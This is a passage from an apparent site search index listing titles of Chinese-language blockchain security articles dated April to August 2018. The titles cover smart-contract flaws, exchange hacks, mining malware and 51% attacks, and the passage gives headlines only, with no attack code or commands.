","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:74","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-16 数字加密货币交易软件APT攻击简报 以太坊智能合约重放攻击细节剖析 以太坊合约审计 CheckList 之“以太坊智能合约规范问题”影响分析报告 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:75","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-14 深入解析新型加密货币挖矿恶意软件ZombieBoy ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:76","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-13 超100家交易所高危漏洞导致50亿价值数字资产受威胁 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:77","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-10 从solidity语言特性深度解读以太坊智能合约漏洞原理和攻击利用 EOS 官方 API 中 Asset 结构体的乘法运算溢出漏洞描述 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:78","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-09 白帽黑客发现以太坊DApp Augur的主要漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:79","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-07 金钱难寐，大盗独行 | 以太坊JSON-RPC接口多种盗币手法大揭秘 看Hidden Bee如何利用新型漏洞进行传播 2018上半年区块链安全报告 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:80","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-03 私钥丢失也能找回以太币？ 门罗币假充值漏洞导致Altex交易所遭受重大损失 SIM token 自动化薅羊毛攻击还原 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:81","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-02 警惕！EOS恶意合约可吞噬用户RAM漏洞分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:82","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-01 金钱难寐，大盗独行——以太坊 JSON-RPC 接口多种盗币手法大揭秘 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:83","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-30 以太坊智能合约中随机数预测 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:84","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-29 分析一个有趣的蜜罐合约 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:85","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-27 区块链安全技术总结 去中心化交易所Waves DEX周二遭受攻击，现已恢复 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:86","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-26 修饰器（modifier）相关漏洞分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:87","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-25 构造函数缺失漏洞分析 警惕 | 恶意EOS合约存在吞噬用户RAM的安全风险 【EOS Fomo3D你千万别玩】狼人杀遭到溢出攻击, 已经凉凉 震惊！利好变利空，烧币也能作假！ Fomo3D山寨版原来是这样留后门的 EOS 安全问题紧急情报通知：警惕 EOS 恶意合约吞噬用户 RAM Solidity中的delegatecall杂谈 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:88","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-24 ERC20不一致性检查（新增balnaces不一致检查漏洞） 直布罗陀区块链交易所RKT存在上溢漏洞 Fomo3D“薅羊毛”攻击揭秘：通过重复的创建预先计算好地址的合约来赢取空投奖金！ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:89","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-23 比特币黑客攻击手段全揭秘 ANNI Token智能合约安全审计报告分析 直布罗陀区块链交易所RKT 存在上溢漏洞 首个区块链 token 的自动化薅羊毛攻击分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:90","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-22 几乎所有钱包都有致命漏洞，黑客接触手机2分钟，就能转走币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:91","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-21 从一道CTF题看智能合约的安全问题 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:92","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-20 Parity多重签名合约Delegatecall漏洞回顾 慎用 EOS 第三方开源 SDK ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:93","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-19 CertiK：一款智能合约的代码审计平台 Parity多重签名函数库自杀漏洞 首个区块链token的自动化薅羊毛攻击分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:94","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-18 EOS被盗事件频起，这里有一份安全攻略可以借鉴 一种新型的constructor函数使用漏洞，可导致合约权限丢失、代币增发 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:95","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-17 LightCoin合约非一致性检查漏洞分析 安恒风暴中心助力编著区块链安全产业全生命周期整体解决方案 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:96","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-16 黑产军团控制四百万肉鸡集群，掘金区块链数字货币 知名比特币网站bustabit价值$12,000的点击劫持、XSS以及拒绝服务漏洞详情揭秘 EOS 假账号安全风险预警 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:97","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-14 EIP827安全事件跟踪 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:98","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-12 “tradeRifle”漏洞再曝交易所安全风险——LBank交易所移动终端可被中间人攻击提取数字资产 以太坊网络架构解析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:99","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-11 浅析AMR智能合约批量转账溢出漏洞 一些EOS账户使用弱助记词生成EOS私钥，存在高危风险 以太坊智能合约OPCODE逆向之理论基础篇 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:100","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-10 Microsoft Azure 以太坊节点控制面板存在未授权访问漏洞 交易所EXX称遭黑客频繁攻击 空手套白狼？USDT 假充值逻辑缺陷漏洞利用分析 Bancor交易所被入侵事件解析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:101","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-09 EDU\u0026BAI任意转走账户Token事件回顾 以太坊代币“假充值”漏洞预警分析 研究人员：去年每一次的ICO平均有五个漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:102","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-05 火币网场外交易存在安全漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:103","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-04 云储币Siacoin交易管理系统Siaberry的几个漏洞 solidity中的继承杂谈 Steem发布补丁，修复停滞漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:104","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-03 研究称：“挖矿劫持”超越勒索软件，成为首要安全威胁 恶意软件“剪贴板劫持者”正监控230万个比特币地址 微信支付的JAVA SDK存在漏洞，各大交易所需尽快自检 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:105","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-07-02 Trezor钱包遭遇BGP劫持，警惕钓鱼网站 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:106","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-29 以太坊JSON-RPC出现新的攻击方式，开放API并解锁过的账户可能已被种下“后门” ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:107","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-28 EPoD: 以太坊Geth客户端拒绝服务漏洞 (CVE-2018-12018) 部分交易所对USDT币充值存在校验缺陷，可通过“假充值”导致市场混乱！ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:108","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-27 区块链黑幕 | 我们不生产“白皮书”，我们只是“白皮书”的搬运工！ HDAC矿池遭受黑客攻击 EOS智能合约的一些问题总结和建议 嗨池称日前遭黑客攻击，将永久关闭 Solidity 安全：已知攻击方法和常见防御模式综合列表 神秘组织BitPico宣布对BCH发动51%攻击 以太坊 Solidity 合约 call 函数簇滥用导致的安全风险 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:109","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-26 Solidity中存储方式错误使用所导致的变量覆盖 以太坊蜜罐智能合约分析 利用网游加速器隧道传播挖矿蠕虫事件分析报告 从以太坊\"MorphToken事件\"看智能合约构造函数大小写编码错误漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:110","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-25 bkex.com 疑似被入侵 平台用户名密码疑似已泄露 ERC223及ERC827实现代码欠缺安全考虑 —— ATN Token中的CUSTOM_CALL漏洞深入分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:111","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-23 Mt.Gox暂停破产,17万枚比特币将退还客户和债主 以太坊去中心化应用dApp的渗透测试姿势浅析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:112","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-22 以太坊智能合约 Owner 相关 CVE 漏洞分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:113","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-21 加密货币2018大事记 | 你来偷，他来抢，币圈是否真的无宁日？ ERC20 智能合约整数溢出系列漏洞披露 以太坊智能合约call注入攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:114","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-20 韩国最大虚拟货币交易平台被黑，价值2亿人民币资产失窃 ERC223智能合约ATN币出现owner权限窃取漏洞 ATN 抵御合约攻击的报告——基于ERC223与DS-AUTH的混合漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:115","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-19 YEED代币存在任意关停交易漏洞 LCX币出现被可任意远程关停交易漏洞 CVE-2018-12018:以太坊存在DDOS漏洞，可致60%节点下线 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:116","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-15 Syndicate钱包遭黑客攻击价值1000万美元的货币被盗 谈谈ERC20涉及面最广重大漏洞之我见 仅需500美元，你也可以完成一次51%双花攻击 智能合约再现漏洞 SNC虚拟货币存在可无限增发情况 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:117","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-13 智能合约RemiCoin再爆任意转账漏洞 ERC20 Token智能合约FuturXe存在任意转账漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:118","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-12 谈谈智能合约中的中心化威胁 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:119","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-11 韩国加密货币交易所Coinrail遭黑客入侵，黑客盗走了价值4000万美元的ICO代币 imToken遭黑客入侵:Amazon AWS 密码泄露 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:120","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-08 ERC20代币Soarcoin (SOAR) 存在后门，合约所有者可任意转移他人代币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:121","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-07 缺少返回值错误 - 至少130个令牌受到影响 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:122","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-06 AACOIN平台出现BUG可无限冲币 以太坊parity客户端存在潜在的共识问题 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:123","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-05 Block.one被黑客入侵，投资者价值数百万美元的代币被骗 通俗易懂谈BEC智能合约致命漏洞 区块链入门漫谈 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:124","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-06-04 EOS节点远程代码执行漏洞：EOS智能合约WASM函数表数组越界分析 ZenCash遭受51％的攻击，因双重支出55万美元 如何渗透测试以太坊 dApps ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:125","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-31 区块链智能合约漏洞，想说补你不容易 浅谈最近流行的三起区块链51%算力攻击 KoreaShow（Ethereum ERC20令牌）的智能合约实施的transferMulti函数中的整数溢出允许攻击者通过制作的_value参数完成未经授权的数字资产增加。 EduCoin智能合约transferFrom任意转账漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:126","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-30 MEWKit： Cryptotheft 的最新武器 黑客从加密货币交易应用Taylor中盗取135万美元 EOS存在P2P拒绝服务漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:127","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-29 区块链史诗级漏洞 可完全控制虚拟货币交易 360 | 数字货币钱包APP安全威胁概况 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:128","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-28 加密货币交易平台Taylor遭黑客攻击：被盗2500余个ETH 蚂蚁矿机多款型号存在远程命令执行漏洞（CVE-2018-11220） EOSIO社区的多名成员在5月27日收到了一封钓鱼邮件 以太坊智能合约安全入门了解一下（下） GATE交易所遭黑客攻击，RLC瞬间爆拉百倍 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:129","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-26 360 | 数字货币钱包安全白皮书 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:130","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-25 基于区块链域名的僵尸网络病毒分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:131","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-24 以太坊erc20智能合约任意转账漏洞分析 BTG(bitcoin gold)受到51%攻击，攻击者利用双重支付获利 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:132","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-22 恶意软件伪装成Cloudflare页面默默挖矿 黑客正在利用Claymore矿机漏洞进行大范围的扫描和攻击 日本加密货币Monacoin受自私采矿攻击攻击 以太坊区块链游戏Ether Cartel存在越权调用漏洞并已被野外利用，合约所有人可被攻击者篡改。 2017年假冒ICO使澳大利亚累计损失约3.4亿澳元 OKEX疑似出现重大bug导致钱生钱 XVG币再次遭受51%算力攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:133","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-19 以太坊智能合约 Hexagon 存在溢出漏洞 部分NEP-5代币存在存储区注入漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:134","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-18 【漏洞预警】挖矿软件Claymore Dual Miner远程命令执行漏洞（CVE-2018-1000049） 以太坊智能合约安全 Dasp Top10 以太坊智能合约Hexagon存在溢出漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:135","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-17 Cryptojacking攻击击中数百个网站挖掘Monero 以太坊智能合约安全入门了解一下（上） ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:136","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-15 攻击者可以在ROC（Rasputin Online Coin）令牌智能合约（CVE-2018-10944）中窃取所有以太币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:137","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-14 伪造微软等企业签名，恶性病毒窃取比特币疯狂挖矿 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:138","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-12 以太坊钱包出现价值两百万的钓鱼陷阱 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:139","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-11 GhostMiner解析：无文件挖矿的新姿势 CVE-2018-10706：ERC20令牌SCA存在整数溢出漏洞，可导致攻击者获得大量代币 最近出现了一种新型使用无文件技术的恶意挖矿软件：GhostMiner 西安警方破获假借区块链之名进行网络传销案件 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:140","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-10 比特币现金挖矿节点修复可能导致网络分裂漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:141","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-09 以太坊Parity钱包 multi-sig库被人越权销毁，导致大量资金冻结 史上最能穷折腾的挖矿木马“520Miner”：控制数千台机器挖矿，却一毛钱都没挣到 CVE-2018-10705：ERC20令牌AURA存在越权调用漏洞，可导致攻击者获得合约所有权 USDT 发行方 Tether 遭受黑客攻击事件 CVE-2018-10666：ERC20令牌IDXM存在越权调用漏洞，可导致攻击者获得合约所有权 攻击者如何在Bancor交易所中实施先行攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:142","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-07 为什么区块链并不总是问题的答案？ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:143","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-04 在私有以太坊上实现针对ERC20数字货币ProxyOverflow漏洞的攻击 极验Geetest | 区块链项目落地后，有哪些坑你不该踩？ 黑客伪造算力盗取多种数字货币 SMT整型溢出漏洞分析笔记 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:144","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-03 由一道CTF题引发的区块链“股权纠纷案” ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:145","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-02 黑客从比特币矿池中窃取83,000美元 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:146","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-05-01 SMT智能合约整型溢出漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:147","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-28 黑客伪造算力从矿池种盗取多种数字货币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:148","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-25 黑客两小时卷走13000美金，MyEtherWallet DNS劫持事件深度分析 BeautyChain（BEC）智能合约中出现了一个灾难性的漏洞（整形溢出漏洞） 以太坊钱包 Myetherwallet 遭 DNS 劫持 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:149","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-23 韩国比特币交易所Yapizon被盗3831 BTC，用户将平摊所有损失 交易所BitGrail被攻击，大量XRB被黑客窃取 币安交易所用户权限被盗 一行代码蒸发了¥6,447,277,680 人民币！ GHash.io矿池对赌博网站BetCoin Dice进行多次付款欺诈，实施双重支出攻击. Blockchain.info 因被 DDoS 攻击服务临时下线 Eligius矿池遭受“块代扣攻击” AntPool，BW.com，NiceHash，CKPool和GHash.io等矿池遭DDOS攻击 BitcoinTalk论坛遭社会工程学攻击 CoinDash项目ICO众筹地址遭到黑客篡改 比特币黄金网站遭遇DDOS攻击 斯洛文尼亚加密挖矿网站Nicehash比特币被盗 数字代币初创公司Tether宣布自己的系统遭遇黑客袭击 通过劫持在线钱包BlackWallet的DNS服务器，黑客窃取40万美金 利用Google Adwords污染搜索结果Coinhoarder钓鱼事件 比特币服务提供商Purse因其电子邮件服务提供商之一已经被入侵，用户资金遭窃 黑客仅通过使用电话号码盗取用户大量比特币 交易所OKEx数位用户平台账号被窃取 CryptoShuffler木马从受害者的钱包中偷走了160,000美元的比特币 Bitcoin gold遭钱包骗局，用户导入数百万美元比特币却不翼而飞 IOTA社区大量用户钱包代币被窃取 有人在twitter上冒充知名人士如Vitalik Buterin诈骗数字货币 印度女子与骗子共享证书，比特币被盗 交易所Cryptsy被攻击，黑客从Cryptsy的“安全/冷钱包”转账比特币和莱特币以及其他更小型的加密币 比特币交易平台BitQuick服务器遭攻击 ShapeShift丢失23万美元数字货币，“内鬼”将安全信息出售给黑客 香港数字货币交易所Gatecoin遭黑客攻击 交易所Bitfinex遭黑客攻击 韩国最大交易所Bithumb三万用户信息被泄露 韩国数字货币交易所Youbite受到黑客入侵，造成的损失相当于平台内总资产的17% 日本最大的比特币交易所之一Coincheck遭黑客攻击 基于以太坊的数字货币Krypton遭受来自一个名为“51% Crew”的组织的51%攻击 比特币网络遭遇垃圾交易攻击 在线黑市Silk Road 2遭遇交易延展性攻击，比特币被盗 Parity客户端附带的多重签名钱包智能合约被发现存在严重漏洞，攻击者可以立即接管钱包并吸收所有资金 运行在以太坊公有链上的The DAO智能合约遭遇攻击 印度比特币交易所Coinsecure公司钱包遭窃取 虚拟货币 Verge(XVG)，遭到攻击 迪拜某加密货币交易所员工窃取20万美元的加密货币供个人使用 火币网遭到DDOS攻击 Mt.Gox（Magic: The Gathering Online Exchange）因安全漏洞被黑，泄露大量数据 世界第三大比特币交易中心Bitomat部分wallet.dat访问权限丢失 作为常用比特币交易的处理中心之一的MyBitcoin宣布遭到黑客攻击，并导致其关闭 由于网站托管供应商Linode的服务器超级管理密码泄露，Bitcoinica交易平台钱包内比特币被黑客窃取 2012年，Bitcoinica两度遭到黑客攻击 Bitcoin Savings and Trust被所有者关闭 Bitfloor交易中心也被黑客入侵，Bitfloor因此暂停运营 澳大利亚Tradefortress比特币银行被盗 波兰比特币交易平台Bidextreme.pl遭受黑客攻击 曾经世界第一的日本交易所Mt.Gox，导致其最终被迫宣布破产 美国数字货币交易所Poloniex被盗 BTC-E比特币交易平台遭受强大的DDOS攻击 交易所LocalBitcoins遭受拒绝服务漏洞攻击 BitPay CEO遭网络钓鱼，资金被骗 国内山寨币交易平台比特儿遭到黑客攻击 全球知名的数字货币交易所Bitstamp系统管理员被诱导执行恶意文件 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:150","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-20 新华社：区块链如何带来个人数据保护“革命” ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:151","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-13 渗透思路 | 加密货币矿工和信用卡信息泄露 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:152","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-10 区块链应用在网络安全的六个案例 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:153","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-04-07 利用树莓派探索以太坊第一部分：环境搭建 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:154","tags":["BlockChain"],"title":"Blockchain Security 